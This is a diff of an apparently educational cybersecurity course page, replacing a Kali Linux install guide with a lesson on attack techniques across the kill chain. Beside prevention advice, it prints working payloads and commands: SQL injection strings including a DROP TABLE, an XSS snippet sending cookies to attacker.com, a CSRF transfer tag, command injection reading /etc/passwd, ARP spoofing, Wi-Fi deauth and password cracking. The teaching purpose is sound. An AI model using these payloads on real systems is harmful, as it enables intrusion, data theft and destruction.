@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Linux Installation Process - NCHS Cybersecurity</title>
+    <title>Lesson 9.1 - NCHS Cybersecurity</title>
     
     
     <link rel="icon" href="../../../img/logo.png">
@@ -698,31 +698,31 @@
                                         <ul class="unit-lessons">
                                             
                                             <li>
-                                                <a href="../lesson1-1/">Lesson 1.1</a>
+                                                <a href="../../unit1/lesson1-1/">Lesson 1.1</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-2/">Lesson 1.2</a>
+                                                <a href="../../unit1/lesson1-2/">Lesson 1.2</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-3/">Lesson 1.3</a>
+                                                <a href="../../unit1/lesson1-3/">Lesson 1.3</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-4/">Lesson 1.4</a>
+                                                <a href="../../unit1/lesson1-4/">Lesson 1.4</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-5/">Lesson 1.5</a>
+                                                <a href="../../unit1/lesson1-5/">Lesson 1.5</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-6/">Lesson 1.6</a>
+                                                <a href="../../unit1/lesson1-6/">Lesson 1.6</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="./">Linux Installation Process</a>
+                                                <a href="../../unit1/installation-process/">Linux Installation Process</a>
                                             </li>
                                             
                                         </ul>
@@ -878,15 +878,15 @@
                                         <ul class="unit-lessons">
                                             
                                             <li>
-                                                <a href="../../unit9/lesson9-1/">Lesson 9.1</a>
+                                                <a href="./">Lesson 9.1</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../../unit9/lesson9-2/">Lesson 9.2</a>
+                                                <a href="../lesson9-2/">Lesson 9.2</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../../unit9/lesson9-3/">Lesson 9.3</a>
+                                                <a href="../lesson9-3/">Lesson 9.3</a>
                                             </li>
                                             
                                         </ul>
@@ -964,142 +964,562 @@
 
     <div class="container">
         
-        <h2 id="what-is-it"><em>What</em> is it?</h2>
-<p>Kali is an operating system that was made <strong><em>specially</em></strong> for cybersecurity work (and hacking as well). It has a large toolkit of useful programs that we're going to learn about, including Hydra, Nmap, Wireshark, Tcpdump, MacChanger, Chisel, Aircrack-ng, etc.</p>
-<h2 id="some-vocab">Some Vocab:</h2>
-<p>As much as we know vocabulary might not be that interesting, it's important to know for the future, since there's a LOT of acronyms and words in cybersecurity that you're going to be hearing and using, so it's best to get used to it.</p>
-<ul>
-<li><strong>Operating System (OS)</strong>: The main software that runs your computer, like Windows, macOS, iOS, GNU/Linux, etc.</li>
-<li><strong>Virtual Machine (VM)</strong>: It's basically a computer <em>inside</em> another computer. You can run your regular OS, like Windows, and still have Kali Linux inside of it</li>
-<li><strong>ISO File (International Organization for Standardization File)</strong>: Sounds fancy, but really it's just a full copy of an OS within one tiny file</li>
-<li><strong>Hypervisor</strong>: Software that creates and manages VMs. Examples are VirtualBox and VMWare Workstation. There's also QEMU, but mostly Linux users use that, and you're likely running on Windows or mac</li>
-<li><strong>Bootable USB</strong>: Just a USB drive (which you hopefully already know about) that can start up a computer and install an OS (we don't need this yet)</li>
-<li><strong>Partitioning</strong>: A more advanced topic, but it's dividing up your drive into sections called <em>partitions</em>, which are like walls for a room. We don't need this yet, but it is good to know</li>
-</ul>
-<p>Now, let's get into the nitty-gritty:</p>
-<h2 id="method-1-easy-way">Method 1: Easy way :)</h2>
-<h3 id="minimum-requirements">Minimum Requirements*:</h3>
+        <h1 id="cyber-threats-attack-techniquesexploits">Cyber Threats &amp; Attack Techniques/Exploits</h1>
+<p>Now we get into the offensive side—how attacks actually work. Understanding attack techniques is essential for defense. You can't protect against threats you don't understand. This lesson covers real-world attack methods used by hackers, from reconnaissance to exploitation to post-compromise activity.</p>
+<h2 id="the-cyber-kill-chain">The Cyber Kill Chain</h2>
+<p>Before diving into specific attacks, understand the typical attack lifecycle. Lockheed Martin developed the <strong>Cyber Kill Chain</strong> model describing stages of a cyber attack:</p>
 <ol>
-<li><code>8 GB</code> of RAM</li>
-<li><code>20-30 GB</code> of free hard drive space</li>
-<li>A decently fast CPU (you probably have this)</li>
+<li><strong>Reconnaissance</strong>: Gather information about target</li>
+<li><strong>Weaponization</strong>: Create malicious payload</li>
+<li><strong>Delivery</strong>: Transmit weapon to target</li>
+<li><strong>Exploitation</strong>: Trigger vulnerability</li>
+<li><strong>Installation</strong>: Install malware/backdoor</li>
+<li><strong>Command and Control (C2)</strong>: Establish communication channel</li>
+<li><strong>Actions on Objectives</strong>: Achieve attacker's goal (steal data, cause damage, etc.)</li>
 </ol>
-<p>*But, how do I know if I meet them? Well, you can press <em><code>Ctrl+Shift+Esc</code></em> on Windows and click on <strong>"Performance"</strong> inside of Task Manager, and it'll give you a spec (specifications) sheet. On mac, you can click on <strong>"About"</strong> in the top menu bar of your computer. On Linux, you can type <strong><code>uname -a</code></strong>, or use a custom program like <code>fastfetch</code></p>
-<h2 id="big-disclaimer-for-windows-users">BIG DISCLAIMER FOR WINDOWS USERS:</h2>
-<ul>
-<li>You NEED to DISABLE something called Hyper-V. If you don't know what that is, for Windows users, Hyper-V will conflict with Virtualbox, making it run poorly and crash often</li>
-<li>To check if you hve Hyper-V, press <code>Win+R</code>, and type <code>optionalfeatures</code>, then press <code>Enter</code></li>
-<li>Look for a "Hyper-V" in the list of shown items. If it's checked, then it's enabled. Uncheck it.<ul>
-<li>Alternative method: go to cmd (Command Prompt), and right click and "Run as Administrator". Then use the following command: <code>bcdedit /set hypervisorlaunchtype off</code></li>
-</ul>
-</li>
-<li>Finally, restart your computer</li>
-</ul>
-<h2 id="big-disclaimer-for-macos-users">BIG DISCLAIMER FOR MACOS USERS:</h2>
-<ul>
-<li>You need to check if you're using an Intel-based Mac or Apple Silicon machine. If your device is M1, M2, M*, then it's <strong>Apple Silicon</strong></li>
-<li>If this is the case, you will need to use a different software for virtualization. You have some options, like <a href="https://getutm.app">UTM</a> or <a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion">VMware Fusion</a>. </li>
-<li>Also, you will have to install Kali Linux using the 
-<em><strong>ARM64 version! Not x86-64!</strong></em></li>
-</ul>
-<hr />
-<p>Now, go to <a href="https://virtualbox.org">virtualbox.org</a></p>
-<p>Click on the download for your OS, and install the program by following the instruction wizard.</p>
-<p><img alt="Virtual Box" src="../../../img/virtual_box.png" /></p>
-<ul>
-<li>Now, go to the <a href="https://kali.org/get-kali">Kali Linux website</a>.</li>
-<li>Download the "Installer" ISO file (<code>~ 4 GB</code> in size)</li>
-<li>Then choose the 64-bit version for modern computers.</li>
-<li>If your computer is old, it could be 32-bit. If so, you may need to check your system specifications as explained above. However, it probably isn't.</li>
-</ul>
-<p><img alt="Kali Installation" src="../../../img/kali_img.png" /></p>
-<blockquote>
-<p>Remember, Apple Silicon machines will install the ARM64 version of Kali Linux instead!</p>
-</blockquote>
-<ul>
-<li>Finally, make your Virtual Machine. Open up VirtualBox and click "New"</li>
-<li>Name it whatever, I'd call it "Kali Linux", or "Kali Machine".</li>
-<li>Type: Linux, Version: Debian (64-bit)</li>
-<li>Allocate at least <code>4 GB</code> of RAM, AKA <code>4096 MB</code>, by dragging the slider or typing in the number in the RAM text box</li>
-<li>Create a Virtual Hrd Disk (allocate <code>25-30 GB</code> minimum)<ul>
-<li>Choose VDI (VirtualBox Disk Image)</li>
-<li>Also select "dynamically allocated" to save space, and allows the VM to grow dynamically in storage size as you begin to add more things</li>
-</ul>
-</li>
-<li>After clicking done, tell it to create, but do NOT tell it to also start yet</li>
-<li>Click on your virtual machine, and then go to settings</li>
-<li>Then go to Storage, and click the empty disk icon</li>
-<li>This is where we "choose a disk file", and select the downloaded Kali ISO</li>
-<li>Then under System, enable PAE/NX if available to you. PAE is Physical Address Extension, and NX is No Execute. These allow for &gt; <code>4 GB</code> of RAM access and prevents non-executable code from being executed in memory segments. If you don't know what that means, just ignore this</li>
-<li>Under Display, increase video memory to <code>128 MB</code></li>
-<li>Finally, save and exit Settings, and click on Start to boot your VM</li>
-<li>Select "Graphical Install" (press Enter, navigate using arrow keys)</li>
-<li>Choose your language, location, keyboard (these can later be changed, doesn't really matter)</li>
-<li>You can set a hostname, or keep the default (kali)</li>
-</ul>
-<h3 id="important-username-is-kali-and-password-is-kali-by-default"><strong>IMPORTANT</strong>: username is <em>kali</em> and password is <em>kali</em> by default!</h3>
-<ul>
-<li>Choose "Guided - use entire disk" for your partitioning</li>
-<li>Then select "All files in one partition"</li>
-<li>Confirm and wait a while. Take a walk outside, take a short nap, whatever you want. Just wait 10-20 minutes and it'll be done</li>
-<li>Restart when prompted</li>
-<li>On first login, enter the username and password</li>
-<li>Then, click the <code>SUPER</code> key (<code>Win</code> key or <code>Cmd</code> key on mac) and type "terminal" or "console" into the search, and open the app</li>
-<li>In the terminal, you can type <code>sudo apt update &amp;&amp; sudo apt upgrade -y</code><ul>
-<li>This command just updates your system</li>
-<li>When prompted with a password, type in your password</li>
-</ul>
-</li>
-<li>Happy Linux!</li>
-</ul>
-<h2 id="method-2-hard-way-bare-metal-installation">Method 2: Hard way (bare metal installation)</h2>
-<p>Alright. You're ready for the real deal. No problem. </p>
-<p><code>WARNING! ⚠️⚠️</code>: This version of installation WILL take space on your disk! This means it will be physically installed, and it will NOT be installed as a VM! Just like Windows or macOS, it will be physically on your device. If you do this incorrectly, it may <strong>wipe your device completely</strong>. I'm not liable for if you mistakenly wipe your drive, it's up to you. Also, I personally do <strong>not recommend you install Kali Linux on a physical drive</strong>. If you want to use Linux for extra practice, install a distribution like <a href="https://www.debian.org/">Debian</a> or <a href="https://linuxmint.com/">Linux Mint</a>. You are risking data loss if done incorrectly, so proceed at your own risk.</p>
-<p>Important things to note are:</p>
-<ul>
-<li>If you install on bare metal, AKA on your physical device, your device may have incompatibility issues. I would recommend doing your own research before doing so</li>
-<li>You may want to install Linux on a secondary drive, since if you use your main one, you will have to create a special partition for Linux to use exclusively, which is more difficult</li>
-<li>You'll need a USB drive with preferably <code>8 GB</code> or more of storage</li>
-<li>You may need to adjust your BIOS (manufacturer specific, meaning it depends on what company made your computer and maybe even where you bought it from) to allow for other bootable devices, which can include removing Secure Boot</li>
-<li>There's some specifics for ARM64 machines like Apple Silicon that will be different!</li>
-<li>Overall, you are likely going to have to do your OWN research to make sure you don't mess anything up.</li>
-</ul>
-<p>Without further ado, these are some general instructions (not perfect):</p>
-<ol>
-<li>Create a bootable USB drive using an app like Balena Etcher or Rufus</li>
-<li>Make space on your hard drive by creating a disk partition of ~<code>30 GB</code> or more, or install on a secondary hard drive</li>
-<li>Boot from the USB drive from BIOS after restarting your computer and smashing the BIOS key as it boots up (typically <code>Esc</code>, <code>F11</code>, <code>F12</code>, or <code>Del</code> depending on the manufacturer)</li>
-<li>Follow the installation process, but make sure you select the right drive and if it's on the same disk as Windows or Mac, you install "alongside" it, not replace </li>
-<li>After going through the setup, you may re-enter the BIOS to change the boot order. What this means is move Linux above Windows so that on first boot you boot into Linux (optional)</li>
-</ol>
-<p>Some important extras:</p>
-<ul>
-<li>Make sure you regularly update your system at least weekly</li>
-<li>Make decent credentials or use a <a href="https://www.yubico.com/">physical key</a></li>
-<li>Never just copy/paste a command without understanding it, look it up at least (even from me!)</li>
-<li>Install packages wisely and preferably from trusted sources</li>
-</ul>
-<p>Happy Linux! :)</p>
+<p>Understanding this chain helps defenders disrupt attacks at various stages.</p>
+<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
+<p><strong>Reconnaissance</strong> is information gathering about a target. The more an attacker knows, the better they can plan their attack.</p>
+<h3 id="passive-reconnaissance">Passive Reconnaissance</h3>
+<p>Gathering information without directly interacting with the target:</p>
+<p><strong>OSINT (Open Source Intelligence):</strong>
+- Public websites and social media
+- LinkedIn profiles (find employees, technology stacks)
+- Job postings (reveal technologies used)
+- Press releases and news articles
+- Public financial records
+- Domain registration information (WHOIS)
+- Search engines (Google dorking)</p>
+<p><strong>Example Google dorks:</strong></p>
+<pre><code>site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com intitle:&quot;index of&quot;
+&quot;@target.com&quot; site:pastebin.com
+</code></pre>
+<p><strong>Shodan</strong>: Search engine for internet-connected devices
+- Find exposed databases, webcams, industrial control systems
+- Identify vulnerable services
+- Map organization's internet-facing assets</p>
+<p><strong>The Wayback Machine</strong>: View historical versions of websites
+- Find old vulnerabilities
+- Discover forgotten subdomains
+- Locate removed content</p>
+<p><strong>DNS Enumeration:</strong></p>
+<pre><code class="language-bash"># Find DNS records
+dig target.com ANY
+nslookup -type=any target.com
+
+# Find mail servers
+dig target.com MX
+
+# Zone transfer attempt (usually blocked)
+dig @ns1.target.com target.com AXFR
+</code></pre>
+<h3 id="active-reconnaissance">Active Reconnaissance</h3>
+<p>Directly interacting with target systems:</p>
+<p><strong>Port Scanning (using Nmap):</strong></p>
+<pre><code class="language-bash"># Basic scan
+nmap target.com
+
+# Service and version detection
+nmap -sV target.com
+
+# OS detection
+nmap -O target.com
+
+# Aggressive scan (combination of techniques)
+nmap -A target.com
+
+# Scan specific ports
+nmap -p 80,443,8080 target.com
+
+# Scan all ports
+nmap -p- target.com
+
+# Stealth SYN scan
+sudo nmap -sS target.com
+</code></pre>
+<p><strong>Network Mapping:</strong></p>
+<pre><code class="language-bash"># Ping sweep to find live hosts
+nmap -sn 192.168.1.0/24
+
+# Traceroute
+traceroute target.com
+
+# Identify routing path
+mtr target.com
+</code></pre>
+<p><strong>Web Application Reconnaissance:</strong>
+- Directory enumeration (find hidden pages)
+- Technology fingerprinting (identify frameworks, CMS)
+- Subdomain discovery
+- API endpoint discovery</p>
+<p><strong>Tools:</strong>
+- <strong>Nikto</strong>: Web server scanner
+- <strong>Dirb/Dirbuster</strong>: Directory brute-forcing
+- <strong>WhatWeb</strong>: Website fingerprinting
+- <strong>Amass</strong>: Subdomain enumeration</p>
+<h2 id="phase-2-scanning-and-enumeration">Phase 2: Scanning and Enumeration</h2>
+<p>After reconnaissance, attackers probe for specific vulnerabilities.</p>
+<h3 id="vulnerability-scanning">Vulnerability Scanning</h3>
+<p><strong>Automated scanners:</strong>
+- <strong>Nessus</strong>: Enterprise vulnerability scanner
+- <strong>OpenVAS</strong>: Open-source alternative
+- <strong>Nmap scripts</strong>: NSE (Nmap Scripting Engine)</p>
+<p>These tools identify:
+- Unpatched software
+- Misconfigurations
+- Default credentials
+- Known vulnerabilities (CVEs)</p>
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>Gather detailed information about discovered services:</p>
+<p><strong>Banner Grabbing:</strong></p>
+<pre><code class="language-bash"># Telnet to grab banner
+telnet target.com 80
+HEAD / HTTP/1.0
+
+# Netcat
+nc target.com 80
+HEAD / HTTP/1.0
+
+# Nmap
+nmap -sV --script=banner target.com
+</code></pre>
+<p><strong>SMB Enumeration (Windows shares):</strong></p>
+<pre><code class="language-bash"># List shares
+smbclient -L //target.com -N
+
+# Enum4linux (comprehensive SMB enumeration)
+enum4linux -a target.com
+</code></pre>
+<p><strong>SNMP Enumeration:</strong></p>
+<pre><code class="language-bash"># SNMP walk
+snmpwalk -v2c -c public target.com
+</code></pre>
+<h2 id="web-application-attacks">Web Application Attacks</h2>
+<p>Web applications are a primary attack surface. Let's examine common vulnerabilities:</p>
+<h3 id="sql-injection">SQL Injection</h3>
+<p><strong>SQL injection</strong> allows attackers to execute arbitrary SQL commands by manipulating input.</p>
+<p><strong>Vulnerable code example:</strong></p>
+<pre><code class="language-python"># BAD - vulnerable to SQL injection
+user_input = request.form['username']
+query = f&quot;SELECT * FROM users WHERE username = '{user_input}'&quot;
+cursor.execute(query)
+</code></pre>
+<p><strong>Attack:</strong></p>
+<pre><code>Username: admin'--
+Password: anything
+
+Resulting query:
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'hash'
+-- Everything after -- is commented out, bypassing password check
+</code></pre>
+<p><strong>More advanced:</strong></p>
+<pre><code>' OR '1'='1
+' UNION SELECT password FROM users--
+'; DROP TABLE users;--
+</code></pre>
+<p><strong>Detection:</strong>
+Try injecting: <code>'</code>, <code>"</code>, <code>1'1</code>, <code>1"1</code>
+Look for: Database errors, unexpected behavior</p>
+<p><strong>Tools:</strong>
+- <strong>SQLmap</strong>: Automated SQL injection tool</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page?id=1&quot; --dbs
+sqlmap -u &quot;http://target.com/page?id=1&quot; -D database --tables
+sqlmap -u &quot;http://target.com/page?id=1&quot; -D database -T users --dump
+</code></pre>
+<p><strong>Prevention:</strong>
+- Use parameterized queries / prepared statements
+- Input validation
+- Least privilege database accounts
+- WAF (Web Application Firewall)</p>
+<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>
+<p><strong>XSS</strong> allows attackers to inject malicious JavaScript into web pages viewed by other users.</p>
+<p><strong>Types:</strong></p>
+<p><strong>Stored XSS</strong>: Script stored in database (most dangerous)</p>
+<pre><code class="language-html">Comment field input:
+&lt;script&gt;
+  // Steal cookies
+  fetch('http://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;
+</code></pre>
+<p><strong>Reflected XSS</strong>: Script in URL, reflected back</p>
+<pre><code>http://target.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<p><strong>DOM-based XSS</strong>: Client-side script manipulation</p>
+<p><strong>Impact:</strong>
+- Cookie theft (session hijacking)
+- Keylogging
+- Phishing via injected forms
+- Defacement
+- Redirect to malicious sites</p>
+<p><strong>Prevention:</strong>
+- Output encoding/escaping
+- Content Security Policy (CSP)
+- HTTPOnly cookies
+- Input validation</p>
+<h3 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h3>
+<p><strong>CSRF</strong> tricks users into performing actions they didn't intend.</p>
+<p><strong>Example attack:</strong>
+Victim is logged into bank.com. Attacker sends email with:</p>
+<pre><code class="language-html">&lt;img src=&quot;http://bank.com/transfer?to=attacker&amp;amount=1000&quot;&gt;
+</code></pre>
+<p>When victim opens email, their browser automatically sends authenticated request to transfer money.</p>
+<p><strong>Prevention:</strong>
+- CSRF tokens (random, unpredictable values)
+- SameSite cookie attribute
+- Verify origin header
+- Require re-authentication for sensitive actions</p>
+<h3 id="command-injection">Command Injection</h3>
+<p>Application executes system commands with user input without proper sanitization.</p>
+<p><strong>Vulnerable code:</strong></p>
+<pre><code class="language-python"># BAD
+ip = request.form['ip']
+os.system(f'ping -c 4 {ip}')
+</code></pre>
+<p><strong>Attack:</strong></p>
+<pre><code>Input: 8.8.8.8; cat /etc/passwd
+Executes: ping -c 4 8.8.8.8; cat /etc/passwd
+</code></pre>
+<p><strong>Command chaining:</strong>
+- <code>;</code> - execute multiple commands
+- <code>&amp;&amp;</code> - execute if previous succeeded
+- <code>||</code> - execute if previous failed
+- <code>|</code> - pipe output</p>
+<h3 id="directory-traversal-path-traversal">Directory Traversal / Path Traversal</h3>
+<p>Access files outside intended directory.</p>
+<p><strong>Example:</strong></p>
+<pre><code>http://target.com/download?file=../../../etc/passwd
+</code></pre>
+<p>Can access:
+- Configuration files
+- Source code
+- Sensitive data
+- System files</p>
+<p><strong>Prevention:</strong>
+- Input validation
+- Whitelist allowed files
+- Canonicalize paths
+- Restrict file system permissions</p>
+<h3 id="file-upload-vulnerabilities">File Upload Vulnerabilities</h3>
+<p>Uploading malicious files that execute on server.</p>
+<p><strong>Attacks:</strong>
+1. Upload PHP shell disguised as image
+2. Bypass filters with double extensions: <code>shell.php.jpg</code>
+3. Bypass MIME type checks
+4. Upload file to accessible directory
+5. Navigate to uploaded file, execute commands</p>
+<p><strong>Prevention:</strong>
+- Validate file type (magic bytes, not just extension)
+- Store uploads outside web root
+- Rename uploaded files
+- Execute with minimal permissions
+- Scan uploads for malware</p>
+<h2 id="network-attacks">Network Attacks</h2>
+<h3 id="man-in-the-middle-mitm">Man-in-the-Middle (MitM)</h3>
+<p>Attacker intercepts communication between two parties.</p>
+<p><strong>ARP Spoofing/Poisoning:</strong></p>
+<pre><code class="language-bash"># Enable IP forwarding
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+
+# ARP spoof (using arpspoof)
+arpspoof -i eth0 -t victim_ip gateway_ip
+arpspoof -i eth0 -t gateway_ip victim_ip
+</code></pre>
+<p>Now all traffic between victim and gateway flows through attacker.</p>
+<p><strong>DNS Spoofing</strong>: Provide false DNS responses
+<strong>SSL Stripping</strong>: Downgrade HTTPS to HTTP
+<strong>Session Hijacking</strong>: Steal session cookies</p>
+<p><strong>Tools:</strong>
+- <strong>Ettercap</strong>: Comprehensive MitM framework
+- <strong>Bettercap</strong>: Modern network attack and monitoring tool
+- <strong>mitmproxy</strong>: Interactive HTTPS proxy</p>
+<p><strong>Prevention:</strong>
+- HTTPS everywhere
+- HSTS (HTTP Strict Transport Security)
+- Certificate pinning
+- ARP inspection
+- Network monitoring</p>
+<h3 id="denial-of-service-dos-distributed-dos-ddos">Denial of Service (DoS) / Distributed DoS (DDoS)</h3>
+<p>Overwhelm system resources to make service unavailable.</p>
+<p><strong>Types:</strong></p>
+<p><strong>Volume-based attacks:</strong>
+- UDP floods
+- ICMP floods
+- Amplification attacks (DNS, NTP, SSDP)</p>
+<p><strong>Protocol attacks:</strong>
+- SYN flood (exhaust connection table)
+- ACK flood
+- Fragmentation attacks</p>
+<p><strong>Application layer attacks:</strong>
+- HTTP flood (legitimate-looking requests)
+- Slowloris (keep connections open)
+- XML bomb / Billion laughs attack</p>
+<p><strong>DDoS</strong>: Same attacks from many sources (botnet)</p>
+<p><strong>Amplification attacks:</strong>
+Attacker spoofs victim's IP, sends small requests to servers that send large responses to victim.</p>
+<p><strong>Example - DNS amplification:</strong>
+1. Attacker sends DNS query with spoofed source (victim's IP)
+2. DNS server sends large response to victim
+3. Amplification factor: 1 byte sent → 100 bytes to victim</p>
+<p><strong>Prevention:</strong>
+- Rate limiting
+- Load balancing
+- CDN services (Cloudflare, Akaike)
+- DDoS mitigation services
+- Network filtering
+- Redundancy</p>
+<h3 id="password-attacks">Password Attacks</h3>
+<p><strong>Brute Force</strong>: Try every possible combination</p>
+<pre><code class="language-bash"># Hydra - network login brute force
+hydra -l admin -P wordlist.txt target.com ssh
+
+# John the Ripper - password hash cracking
+john --wordlist=rockyou.txt hashes.txt
+</code></pre>
+<p><strong>Dictionary Attack</strong>: Try common passwords from wordlist</p>
+<pre><code class="language-bash"># Hashcat - GPU-accelerated cracking
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+</code></pre>
+<p><strong>Credential Stuffing</strong>: Use leaked credentials from other breaches</p>
+<p><strong>Pass-the-Hash</strong>: Use password hash without cracking it</p>
+<p><strong>Rainbow Tables</strong>: Precomputed hash tables</p>
+<p><strong>Tools:</strong>
+- <strong>Hydra</strong>: Network login brute force
+- <strong>John the Ripper</strong>: Password cracking
+- <strong>Hashcat</strong>: GPU-accelerated cracking
+- <strong>Medusa</strong>: Parallel brute-forcing
+- <strong>CeWL</strong>: Create custom wordlists from websites</p>
+<p><strong>Prevention:</strong>
+- Strong password policies
+- Account lockout after failed attempts
+- MFA (multi-factor authentication)
+- Password hashing with salt
+- Rate limiting
+- Monitoring for credential stuffing patterns</p>
+<h2 id="social-engineering">Social Engineering</h2>
+<p><strong>Social engineering</strong> exploits human psychology rather than technical vulnerabilities.</p>
+<h3 id="phishing">Phishing</h3>
+<p>Fraudulent attempts to obtain sensitive information.</p>
+<p><strong>Types:</strong>
+- <strong>Email phishing</strong>: Mass emails pretending to be legitimate
+- <strong>Spear phishing</strong>: Targeted emails to specific individuals
+- <strong>Whaling</strong>: Targeted at executives
+- <strong>Smishing</strong>: SMS phishing
+- <strong>Vishing</strong>: Voice call phishing</p>
+<p><strong>Tactics:</strong>
+- Urgency ("Your account will be closed!")
+- Authority ("This is IT, send me your password")
+- Fear ("You've been hacked, click here")
+- Curiosity ("Look at this crazy video of you")
+- Greed ("You've won a prize!")</p>
+<p><strong>Prevention:</strong>
+- Security awareness training
+- Email filtering
+- Verify unexpected requests through different channel
+- Check sender addresses carefully
+- Hover over links before clicking</p>
+<h3 id="pretexting">Pretexting</h3>
+<p>Creating fabricated scenario to obtain information.</p>
+<p>Example: Attacker calls as IT support needing password to "fix" problem.</p>
+<h3 id="baiting">Baiting</h3>
+<p>Leaving infected USB drives, offering free downloads, etc.</p>
+<h3 id="tailgating-piggybacking">Tailgating / Piggybacking</h3>
+<p>Following authorized person through secure door.</p>
+<h3 id="dumpster-diving">Dumpster Diving</h3>
+<p>Searching trash for sensitive information.</p>
+<p><strong>Best defense against social engineering</strong>: User education and healthy skepticism.</p>
+<h2 id="wireless-attacks">Wireless Attacks</h2>
+<h3 id="wi-fi-attacks">Wi-Fi Attacks</h3>
+<p><strong>WEP Cracking</strong> (outdated but still seen):</p>
+<pre><code class="language-bash"># Capture packets
+airodump-ng wlan0mon
+
+# Crack WEP key
+aircrack-ng capture.cap
+</code></pre>
+<p><strong>WPA/WPA2 Attacks:</strong></p>
+<pre><code class="language-bash"># Capture handshake
+airodump-ng -c 6 --bssid [AP MAC] -w capture wlan0mon
+
+# Deauth clients to force handshake
+aireplay-ng --deauth 10 -a [AP MAC] wlan0mon
+
+# Crack with wordlist
+aircrack-ng -w wordlist.txt capture.cap
+</code></pre>
+<p><strong>Evil Twin Attack:</strong>
+1. Create fake access point with same SSID
+2. Stronger signal than legitimate AP
+3. Users connect to fake AP
+4. Intercept all traffic</p>
+<p><strong>Tools:</strong>
+- <strong>Aircrack-ng suite</strong>: Complete wireless security toolkit
+- <strong>Wifite</strong>: Automated wireless attack tool
+- <strong>Reaver</strong>: WPS attack tool
+- <strong>Kismet</strong>: Wireless network detector</p>
+<h3 id="bluetooth-attacks">Bluetooth Attacks</h3>
+<p><strong>Bluejacking</strong>: Sending unsolicited messages
+<strong>Bluesnarfing</strong>: Stealing data from device
+<strong>Bluebugging</strong>: Taking control of device</p>
+<h2 id="malware-and-exploitation">Malware and Exploitation</h2>
+<h3 id="common-malware-types">Common Malware Types</h3>
+<p><strong>Ransomware</strong>: Encrypts files, demands payment
+<strong>Keyloggers</strong>: Record keystrokes
+<strong>RATs</strong> (Remote Access Trojans): Give attacker full control
+<strong>Banking Trojans</strong>: Steal financial credentials
+<strong>Adware/Spyware</strong>: Display ads, track behavior
+<strong>Rootkits</strong>: Hide malware presence
+<strong>Bootkits</strong>: Infect boot process
+<strong>Fileless malware</strong>: Runs in memory, no files written to disk</p>
+<h3 id="exploitation-frameworks">Exploitation Frameworks</h3>
+<p><strong>Metasploit</strong>: Most popular exploitation framework</p>
+<pre><code class="language-bash"># Start Metasploit
+msfconsole
+
+# Search for exploits
+search apache
+
+# Use an exploit
+use exploit/unix/webapp/php_cgi_arg_injection
+
+# Set options
+set RHOST target.com
+set RPORT 80
+
+# Run exploit
+exploit
+</code></pre>
+<p><strong>Components:</strong>
+- <strong>Exploits</strong>: Code that takes advantage of vulnerabilities
+- <strong>Payloads</strong>: Code that runs after successful exploit (shell, meterpreter)
+- <strong>Encoders</strong>: Obfuscate payloads to evade detection
+- <strong>Post modules</strong>: Run after compromise (escalate privileges, pivot)</p>
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<p>After gaining initial access, attackers:</p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p><strong>Vertical escalation</strong>: Low privilege → high privilege (user → root)
+<strong>Horizontal escalation</strong>: Access other users' accounts</p>
+<p><strong>Linux privilege escalation:</strong>
+- SUID binaries with vulnerabilities
+- Kernel exploits
+- Misconfigured sudo
+- Writable system files
+- Cron jobs as root</p>
+<p><strong>Windows privilege escalation:</strong>
+- Unpatched vulnerabilities
+- Misconfigured services
+- Weak registry/file permissions
+- Token impersonation
+- DLL hijacking</p>
+<h3 id="persistence">Persistence</h3>
+<p>Maintaining access after reboot or remediation.</p>
+<p><strong>Methods:</strong>
+- Create backdoor accounts
+- Install rootkits
+- Modify startup scripts
+- Schedule tasks
+- Web shells
+- Remote access tools</p>
+<h3 id="lateral-movement">Lateral Movement</h3>
+<p>Moving from initially compromised system to other systems.</p>
+<p><strong>Techniques:</strong>
+- Pass-the-hash
+- Credential dumping
+- Exploiting trust relationships
+- Remote command execution
+- Pivoting through compromised systems</p>
+<h3 id="data-exfiltration">Data Exfiltration</h3>
+<p>Stealing data without detection.</p>
+<p><strong>Methods:</strong>
+- FTP/HTTP upload
+- DNS tunneling
+- Steganography
+- Encrypted channels
+- Physical media
+- Cloud storage</p>
+<h2 id="advanced-persistent-threats-apts">Advanced Persistent Threats (APTs)</h2>
+<p>Sophisticated, prolonged attacks (often nation-state):</p>
+<p><strong>Characteristics:</strong>
+- Well-funded, skilled attackers
+- Specific targets
+- Long-term access
+- Custom malware
+- Multiple attack vectors
+- Attempts to avoid detection</p>
+<p><strong>Kill chain:</strong>
+1. Initial reconnaissance
+2. Initial compromise (spear phishing, zero-day exploits)
+3. Establish foothold
+4. Escalate privileges
+5. Internal reconnaissance
+6. Lateral movement
+7. Maintain presence
+8. Exfiltrate data</p>
+<p><strong>Examples:</strong>
+- APT28/Fancy Bear (Russian)
+- APT29/Cozy Bear (Russian)
+- APT1/Comment Crew (Chinese)
+- Equation Group (NSA)</p>
+<h2 id="detection-and-attribution">Detection and Attribution</h2>
+<h3 id="indicators-of-compromise-iocs">Indicators of Compromise (IoCs)</h3>
+<p>Evidence of intrusion:
+- Unusual network traffic
+- Suspicious processes
+- New user accounts
+- Modified system files
+- Registry changes
+- Unexpected outbound connections</p>
+<h3 id="tactics-techniques-and-procedures-ttps">Tactics, Techniques, and Procedures (TTPs)</h3>
+<p>Behavioral patterns of threat actors.</p>
